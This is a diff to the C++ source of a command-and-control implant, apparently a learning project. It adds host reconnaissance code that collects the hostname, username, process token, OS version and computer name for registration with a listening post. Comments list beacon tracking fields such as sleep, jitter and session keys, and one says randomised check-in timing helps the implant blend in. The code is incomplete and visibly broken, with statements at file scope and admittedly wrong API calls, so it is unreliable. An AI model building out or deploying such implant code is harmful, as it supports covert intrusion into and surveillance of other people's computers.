@@ -10,6 +10,10 @@
 #include <iostream>
 #include <chrono>
 #include <algorithm>
+#include<map>
+#include <unistd.h>
+#include <tchar.h>
+#include <stdio.h>
 
 #include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/json_parser.hpp>
@@ -20,6 +24,69 @@
 #include <nlohmann/json.hpp>
 
 using json = nlohmann::json;
+
+//create id fro implant
+UUID implantID;
+UuidCreate( &implantID );
+
+//https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
+//https://pureinfotech.com/list-environment-variables-windows-10/
+TCHAR* envVarStrings[] =
+{
+  TEXT("OS           = %OS%"),
+  TEXT("PATH         = %PATH%"),
+  TEXT("TEMP         = %TEMP%"),
+  TEXT("COMPUTERNAME = %COMPUTERNAME%"),
+  TEXT("USERNAME     = %USERNAME")
+};
+#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
+#define SIZE 32767
+void printError(TCHAR* msg);
+
+TCHAR infoBuff[SIZE];
+
+//situational awareness
+void Implant::sitAware(){
+    //make a dictionary in c++
+    //https://www.codespeedy.com/dictionary-in-cpp/
+    map<string, string> initVals;
+
+    initVals["implantID"] = implantID;
+    
+    //might be calling these functions wrong!!
+    //https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
+
+    initVals["hostname"] = gethostname(); //--> need to call hostname
+    initVals["username"] = getlogin(); //--> need to call whoami 
+    //https://stackoverflow.com/questions/8953424/how-to-get-the-username-in-c-c-in-linux
+    initVals["token"] = GetCurrentProcessToken();
+
+    //idk how to get this or what this is
+    initVals["networkInterfaces"]; 
+
+    //https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion
+    initVals["os_version"] = GetVersion();
+    initVals["os_name"] = GetComputerName();
+    
+    //dont know if to create a new one or if it already exists
+    initVals["compGUID"];
+
+
+    // connectionIP
+    // sessionKey
+    // initVals["sleepTime"] = dwellDistributionSeconds;
+    // jitter
+    // firstCheckIn
+    // lastCheckIn
+    // os_type
+    // os_version
+}
+
+// C2 = 
+// REGISTER = 
+// TASK =
+
+//register the implant 
 
 
 // Function to send an asynchronous HTTP POST request with a payload to the listening post
@@ -64,6 +131,21 @@ void Implant::setMeanDwell(double meanDwell) {
     // Exponential_distribution allows the implant to blend in more with the rest of the internet
     dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
 }
+
+//set the situational awareness for the implant
+
+// Implant ID: create an ID for the implant to distinguish it from others
+// Computer Name: what computer did it connect from?
+// Username: what user are you running as?
+// GUID: what is the computer’s GUID?
+// Integrity: what privileges do you have?
+// Connecting IP address: what address did it connect from?
+// Session Key: after you negotiated a session key, store it per agent
+// Sleep: how often does the agent check in?
+// Jitter: how random of a check in is it?
+// First Seen: when did the agent first check in?
+// Last Seen: when was the last time you saw the agent?
+// Expected Check in: When should you expect to see the agent again?
 
 // Method to send task results and receive new tasks
 [[nodiscard]] std::string Implant::sendResults() {
@@ -165,6 +247,7 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     // Options for configuration settings
     isRunning{ true },
     dwellDistributionSeconds{ 1. },
+
     // Thread that runs all our tasks, performs asynchronous I/O
     taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
 }
